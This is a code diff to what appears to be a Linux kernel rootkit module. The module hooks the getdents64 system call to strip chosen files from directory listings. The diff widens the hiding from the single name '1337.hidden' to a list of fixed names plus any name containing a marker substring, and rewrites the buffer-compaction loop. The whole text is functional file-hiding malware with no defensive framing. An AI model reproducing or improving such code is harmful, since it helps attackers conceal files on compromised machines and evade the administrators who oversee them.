@@ -7,10 +7,26 @@
 #include <linux/unistd.h>
 
 #include <linux/dirent.h>
+#include <linux/string.h>
 
 #include "syscall.h"
 
 MODULE_LICENSE("GPL"); // nt torvalds
+
+static int is_dir_hidden(const char *name) {
+    static const char *hidden_files[] = {"lolzor", "1337.hidden", "abcdef", "zabcdef"};
+    static const char *hidden_substrs[] = {"xDDDx"};
+
+    for (int i = 0; i < sizeof(hidden_files) / sizeof(hidden_files[0]); i++)
+        if (!strcmp(name, hidden_files[i]))
+            return 1;
+
+    for (int i = 0; i < sizeof(hidden_substrs) / sizeof(hidden_substrs[0]); i++)
+        if (strstr(name, hidden_substrs[i]))
+            return 1;
+
+    return 0;
+}
 
 asmlinkage long getdents64_hide(struct pt_regs *regs) {
     long size = (orig_syscall(__NR_getdents64))(regs);
@@ -28,11 +44,14 @@ asmlinkage long getdents64_hide(struct pt_regs *regs) {
     struct linux_dirent64 *dir = NULL;
     for (unsigned long offset = 0; offset < nsize; offset += dir->d_reclen) {
         dir = (struct linux_dirent64*)(buf + offset);
-        if (!strcmp("1337.hidden", dir->d_name)) {
-            nsize -= dir->d_reclen;
+        if (is_dir_hidden(dir->d_name)) {
+            int len = dir->d_reclen;
+
             if (offset < nsize)
-                memcpy(buf + offset, buf + offset + dir->d_reclen, nsize - offset);
-            continue;
+                memcpy(buf + offset, buf + offset + len, nsize - (offset + len));
+
+            nsize -= len;
+            offset -= len;
         }
     }
 
